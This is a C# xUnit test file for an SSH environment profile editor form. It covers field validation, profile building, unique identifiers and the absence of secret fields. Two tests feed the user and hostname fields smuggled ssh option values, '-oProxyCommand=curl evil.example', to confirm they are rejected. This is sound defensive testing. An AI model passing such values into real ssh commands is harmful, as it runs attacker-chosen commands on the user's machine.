using System.Reflection;
using OmpOS.Contracts.Environments;
using OmpOS.Presentation.Remote;
using Shouldly;
using Xunit;

namespace OmpOS.Presentation.Tests;

/// <summary>The add and edit form: live problems per field, a built profile that always passes the validator, a unique identifier, and no field for a secret.</summary>
public sealed class RemoteProfileEditorTests
{
    private static readonly IReadOnlySet<string> NoIds = new HashSet<string>(StringComparer.Ordinal);

    private static RemoteProfileEditor Valid(string alias = "dev-box")
    {
        var editor = RemoteProfileEditor.ForNew(alias, NoIds);
        editor.RemoteWorkspaceRoot = "/home/dev/work";
        return editor;
    }

    /// <summary>A form started from an ssh config alias fixes the alias, names the environment after it and asks only for the remote folder.</summary>
    [Fact]
    public void AFormFromTheSshConfigIsFixedToItsAlias()
    {
        var editor = RemoteProfileEditor.ForNew("dev-box", NoIds);

        editor.AliasIsFixed.ShouldBeTrue();
        editor.IsNew.ShouldBeTrue();
        editor.Heading.ShouldBe(RemoteCopy.AddHeading);
        editor.Alias.ShouldBe("dev-box");
        editor.DisplayName.ShouldBe("dev-box");
        editor.KeepAliveText.ShouldBe("15");
        editor.Issues.Select(issue => issue.Field).ShouldBe(["RemoteWorkspaceRoot"]);
        editor.IsValid.ShouldBeFalse();
    }

    /// <summary>A hand-entered form starts empty and lists every missing field.</summary>
    [Fact]
    public void AHandEnteredFormListsEveryMissingField()
    {
        var editor = RemoteProfileEditor.ForNew(alias: null, NoIds);

        editor.AliasIsFixed.ShouldBeFalse();
        editor.Issues.Select(issue => issue.Field).Order(StringComparer.Ordinal).ToArray().ShouldBe(["Alias", "DisplayName", "RemoteWorkspaceRoot"]);
        editor.TryBuild(out var profile).ShouldBeFalse();
        profile.ShouldBeNull();
    }

    /// <summary>The problems follow the values as they are typed, one per field, and clear when the value is fixed.</summary>
    [Fact]
    public void ProblemsFollowTheValues()
    {
        var editor = Valid();
        var changed = new List<string?>();
        editor.PropertyChanged += (_, e) => changed.Add(e.PropertyName);

        editor.PortText = "99999";
        editor.KeepAliveText = "abc";
        editor.RemoteWorkspaceRoot = "relative/path";
        editor.User = "-oProxyCommand=evil";
        editor.IdentityFile = "-i";
        editor.RemoteOmpPath = "../omp";

        editor.Issues.Select(issue => issue.Field).Order(StringComparer.Ordinal).ToArray().ShouldBe(["IdentityFile", "KeepAliveText", "PortText", "RemoteOmpPath", "RemoteWorkspaceRoot", "User"]);
        editor.Issues.ShouldAllBe(issue => issue.Message.Length > 0);
        editor.IsValid.ShouldBeFalse();
        changed.ShouldContain("PortText", StringComparer.Ordinal);
        changed.ShouldContain("IsValid", StringComparer.Ordinal);

        editor.PortText = "2222";
        editor.KeepAliveText = "30";
        editor.RemoteWorkspaceRoot = "/srv/app";
        editor.User = "dev";
        editor.IdentityFile = "/home/me/.ssh/id_ed25519";
        editor.RemoteOmpPath = "/opt/omp/bin/omp";

        editor.Issues.ShouldBeEmpty();
        editor.IsValid.ShouldBeTrue();
    }

    /// <summary>A message never contains the value that was rejected.</summary>
    [Fact]
    public void AMessageNeverEchoesTheRejectedValue()
    {
        var editor = Valid();

        editor.User = "-oProxyCommand=curl evil.example";
        editor.Hostname = "-oProxyCommand=curl evil.example";

        editor.Issues.Count.ShouldBe(2);
        editor.Issues.ShouldAllBe(issue => !issue.Message.Contains("evil", StringComparison.Ordinal));
    }

    /// <summary>A valid form builds a trimmed ssh profile with an identifier derived from the alias, empty optional fields as null and the typed numbers.</summary>
    [Fact]
    public void AValidFormBuildsATrimmedProfile()
    {
        var editor = Valid("Dev.Box_1");
        editor.DisplayName = "  Build box ";
        editor.Hostname = " 10.0.0.5 ";
        editor.PortText = "2200";
        editor.User = "dev";
        editor.ProxyJump = "jump@bastion.example";
        editor.RemoteWorkspaceRoot = " /srv/app ";
        editor.ForwardAgent = true;
        editor.KeepAliveText = "60";

        editor.TryBuild(out var profile).ShouldBeTrue();

        var built = profile.ShouldNotBeNull();
        built.Id.ShouldBe("ssh-dev.box_1");
        built.DisplayName.ShouldBe("Build box");
        built.Kind.ShouldBe(EnvironmentKind.Ssh);
        var ssh = built.Ssh.ShouldNotBeNull();
        ssh.Alias.ShouldBe("Dev.Box_1");
        ssh.Hostname.ShouldBe("10.0.0.5");
        ssh.Port.ShouldBe(2200);
        ssh.User.ShouldBe("dev");
        ssh.IdentityFile.ShouldBeNull();
        ssh.ProxyJump.ShouldBe("jump@bastion.example");
        ssh.RemoteWorkspaceRoot.ShouldBe("/srv/app");
        ssh.RemoteOmpPath.ShouldBeNull();
        ssh.ForwardAgent.ShouldBeTrue();
        ssh.KeepAliveSeconds.ShouldBe(60);
        EnvironmentProfileValidator.IsValid(built).ShouldBeTrue();
    }

    /// <summary>The identifier of a new environment is unique among the existing ones and never longer than 64 characters.</summary>
    [Fact]
    public void TheIdentifierIsUniqueAndBounded()
    {
        var taken = new HashSet<string>(StringComparer.Ordinal) { "ssh-dev-box", "ssh-dev-box-2" };
        var editor = RemoteProfileEditor.ForNew("dev-box", taken);
        editor.RemoteWorkspaceRoot = "/w";
        var longAlias = RemoteProfileEditor.ForNew(new string('a', 120), NoIds);
        longAlias.RemoteWorkspaceRoot = "/w";
        longAlias.DisplayName = "Long alias";

        editor.TryBuild(out var profile).ShouldBeTrue();
        longAlias.TryBuild(out var longProfile).ShouldBeTrue();

        profile!.Id.ShouldBe("ssh-dev-box-3");
        longProfile!.Id.Length.ShouldBe(64);
        EnvironmentProfileValidator.IsValid(longProfile).ShouldBeTrue();
    }

    /// <summary>Editing keeps the identifier and the extra ssh options of the stored profile, shows its values, and allows the alias to change.</summary>
    [Fact]
    public void EditingKeepsTheIdentifierAndTheOptions()
    {
        var stored = new EnvironmentProfile
        {
            Id = "box-1",
            DisplayName = "Box",
            Kind = EnvironmentKind.Ssh,
            Ssh = new SshProfile
            {
                Alias = "box",
                Port = 2201,
                RemoteWorkspaceRoot = "/srv/box",
                Options = new Dictionary<string, string>(StringComparer.Ordinal) { ["ConnectTimeout"] = "30" },
                KeepAliveSeconds = 45,
            },
        };

        var editor = RemoteProfileEditor.ForEdit(stored);
        editor.PortText.ShouldBe("2201");
        editor.KeepAliveText.ShouldBe("45");
        editor.Heading.ShouldBe(RemoteCopy.EditHeading);
        editor.IsNew.ShouldBeFalse();
        editor.AliasIsFixed.ShouldBeFalse();
        editor.Alias = "box-renamed";
        editor.TryBuild(out var rebuilt).ShouldBeTrue();

        rebuilt!.Id.ShouldBe("box-1");
        rebuilt.Ssh!.Alias.ShouldBe("box-renamed");
        rebuilt.Ssh.Options["ConnectTimeout"].ShouldBe("30");
    }

    /// <summary>Only an ssh environment can be edited, and a null argument is refused.</summary>
    [Fact]
    public void OnlyAnSshEnvironmentCanBeEdited()
    {
        var local = new EnvironmentProfile { Id = "local", DisplayName = "Local", Kind = EnvironmentKind.Local };

        Should.Throw<ArgumentException>(() => RemoteProfileEditor.ForEdit(local));
        Should.Throw<ArgumentNullException>(() => RemoteProfileEditor.ForEdit(null!));
        Should.Throw<ArgumentNullException>(() => RemoteProfileEditor.ForNew("a", null!));
    }

    /// <summary>The agent forwarding warning is shown exactly while the switch is on.</summary>
    [Fact]
    public void TheForwardAgentWarningFollowsTheSwitch()
    {
        var editor = Valid();

        editor.ShowForwardAgentWarning.ShouldBeFalse();
        editor.ForwardAgent = true;
        editor.ShowForwardAgentWarning.ShouldBeTrue();
        editor.ForwardAgent = false;
        editor.ShowForwardAgentWarning.ShouldBeFalse();
    }

    /// <summary>The form has no member that could hold a password, passphrase, key or token.</summary>
    [Fact]
    public void TheFormHasNoSecretField()
    {
        var names = typeof(RemoteProfileEditor).GetProperties(BindingFlags.Public | BindingFlags.Instance).Select(property => property.Name);

        foreach (var forbidden in new[] { "password", "passphrase", "secret", "token", "privatekey", "credential" })
        {
            names.ShouldAllBe(name => !name.Contains(forbidden, StringComparison.OrdinalIgnoreCase));
        }
    }
}
